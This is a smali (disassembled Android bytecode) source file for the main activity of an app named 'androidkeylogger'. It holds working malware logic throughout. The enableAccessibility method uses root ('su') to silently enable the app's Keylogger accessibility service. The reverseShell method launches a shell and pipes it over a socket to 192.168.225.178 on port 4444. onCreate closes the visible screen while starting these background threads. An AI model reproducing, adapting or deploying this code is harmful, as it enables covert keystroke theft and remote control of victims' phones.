.class public Lcom/bshu2/androidkeylogger/MainActivity;
.super Landroid/support/v7/app/AppCompatActivity;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/bshu2/androidkeylogger/MainActivity$Startup;,
        Lcom/bshu2/androidkeylogger/MainActivity$100000000;,
        Lcom/bshu2/androidkeylogger/MainActivity$100000001;
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 134
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/support/v7/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method private static forwardStream(Ljava/io/InputStream;Ljava/io/OutputStream;)V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/io/InputStream;",
            "Ljava/io/OutputStream;",
            ")V"
        }
    .end annotation

    .prologue
    .line 82
    move-object v0, p0

    move-object v1, p1

    new-instance v4, Ljava/lang/Thread;

    move-object v10, v4

    move-object v4, v10

    move-object v5, v10

    new-instance v6, Lcom/bshu2/androidkeylogger/MainActivity$100000001;

    move-object v10, v6

    move-object v6, v10

    move-object v7, v10

    move-object v8, v0

    move-object v9, v1

    invoke-direct {v7, v8, v9}, Lcom/bshu2/androidkeylogger/MainActivity$100000001;-><init>(Ljava/io/InputStream;Ljava/io/OutputStream;)V

    invoke-direct {v5, v6}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v4}, Ljava/lang/Thread;->start()V

    return-void
.end method


# virtual methods
.method enableAccessibility()V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 112
    move-object v0, p0

    const-string v5, "MainActivity"

    const-string v6, "enableAccessibility"

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v5

    .line 113
    invoke-static {}, Landroid/os/Looper;->myLooper()Landroid/os/Looper;

    move-result-object v5

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v6

    if-ne v5, v6, :cond_0

    .line 114
    const-string v5, "MainActivity"

    const-string v6, "on main thread"

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v5

    .line 131
    :goto_0
    return-void

    .line 117
    :cond_0
    const-string v5, "MainActivity"

    const-string v6, "not on main thread"

    invoke-static {v5, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v5

    .line 120
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v5

    const-string v6, "su"

    invoke-virtual {v5, v6}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v5

    move-object v2, v5

    .line 121
    new-instance v5, Ljava/io/DataOutputStream;

    move-object v8, v5

    move-object v5, v8

    move-object v6, v8

    move-object v7, v2

    invoke-virtual {v7}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    move-object v3, v5

    .line 122
    move-object v5, v3

    const-string v6, "settings put secure enabled_accessibility_services com.bshu2.androidkeylogger/com.bshu2.androidkeylogger.Keylogger\n"

    invoke-virtual {v5, v6}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 123
    move-object v5, v3

    invoke-virtual {v5}, Ljava/io/DataOutputStream;->flush()V

    .line 124
    move-object v5, v3

    const-string v6, "settings put secure accessibility_enabled 1\n"

    invoke-virtual {v5, v6}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 125
    move-object v5, v3

    invoke-virtual {v5}, Ljava/io/DataOutputStream;->flush()V

    .line 126
    move-object v5, v3

    const-string v6, "exit\n"

    invoke-virtual {v5, v6}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 127
    move-object v5, v3

    invoke-virtual {v5}, Ljava/io/DataOutputStream;->flush()V

    .line 129
    move-object v5, v2

    invoke-virtual {v5}, Ljava/lang/Process;->waitFor()I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v5

    goto :goto_0

    :catch_0
    move-exception v5

    move-object v2, v5

    .line 131
    move-object v5, v2

    invoke-virtual {v5}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/os/Bundle;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    const-string v4, "com.aide.ui"

    invoke-static {v3, v4}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 34
    move-object v3, v0

    move-object v4, v1

    invoke-super {v3, v4}, Landroid/support/v7/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    .line 35
    const-string v3, "MainActivity"

    const-string v4, "onCreate"

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    .line 37
    move-object v3, v0

    const v4, 0x7f04001b

    invoke-virtual {v3, v4}, Lcom/bshu2/androidkeylogger/MainActivity;->setContentView(I)V

    .line 39
    new-instance v3, Lcom/bshu2/androidkeylogger/MainActivity$Startup;

    move-object v8, v3

    move-object v3, v8

    move-object v4, v8

    move-object v5, v0

    invoke-direct {v4, v5}, Lcom/bshu2/androidkeylogger/MainActivity$Startup;-><init>(Lcom/bshu2/androidkeylogger/MainActivity;)V

    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Void;

    invoke-virtual {v3, v4}, Lcom/bshu2/androidkeylogger/MainActivity$Startup;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    move-result-object v3

    .line 40
    move-object v3, v0

    invoke-virtual {v3}, Lcom/bshu2/androidkeylogger/MainActivity;->finish()V

    .line 42
    new-instance v3, Ljava/lang/Thread;

    move-object v8, v3

    move-object v3, v8

    move-object v4, v8

    new-instance v5, Lcom/bshu2/androidkeylogger/MainActivity$100000000;

    move-object v8, v5

    move-object v5, v8

    move-object v6, v8

    move-object v7, v0

    invoke-direct {v6, v7}, Lcom/bshu2/androidkeylogger/MainActivity$100000000;-><init>(Lcom/bshu2/androidkeylogger/MainActivity;)V

    invoke-direct {v4, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public reverseShell()V
    .locals 10
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V^",
            "Ljava/lang/Exception;"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .prologue
    .line 61
    move-object v0, p0

    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v5

    const-string v6, "system/bin/sh"

    invoke-virtual {v5, v6}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v5

    move-object v2, v5

    .line 64
    new-instance v5, Ljava/net/Socket;

    move-object v9, v5

    move-object v5, v9

    move-object v6, v9

    const-string v7, "192.168.225.178"

    const/16 v8, 0x115c

    invoke-direct {v6, v7, v8}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    move-object v3, v5

    .line 70
    move-object v5, v3

    invoke-virtual {v5}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v5

    move-object v6, v2

    invoke-virtual {v6}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v6

    invoke-static {v5, v6}, Lcom/bshu2/androidkeylogger/MainActivity;->forwardStream(Ljava/io/InputStream;Ljava/io/OutputStream;)V

    .line 71
    move-object v5, v2

    invoke-virtual {v5}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v5

    move-object v6, v3

    invoke-virtual {v6}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v6

    invoke-static {v5, v6}, Lcom/bshu2/androidkeylogger/MainActivity;->forwardStream(Ljava/io/InputStream;Ljava/io/OutputStream;)V

    .line 72
    move-object v5, v2

    invoke-virtual {v5}, Ljava/lang/Process;->getErrorStream()Ljava/io/InputStream;

    move-result-object v5

    move-object v6, v3

    invoke-virtual {v6}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v6

    invoke-static {v5, v6}, Lcom/bshu2/androidkeylogger/MainActivity;->forwardStream(Ljava/io/InputStream;Ljava/io/OutputStream;)V

    .line 73
    move-object v5, v2

    invoke-virtual {v5}, Ljava/lang/Process;->waitFor()I

    move-result v5

    .line 76
    move-object v5, v3

    invoke-virtual {v5}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/InputStream;->close()V

    .line 77
    move-object v5, v3

    invoke-virtual {v5}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/OutputStream;->close()V

    return-void
.end method
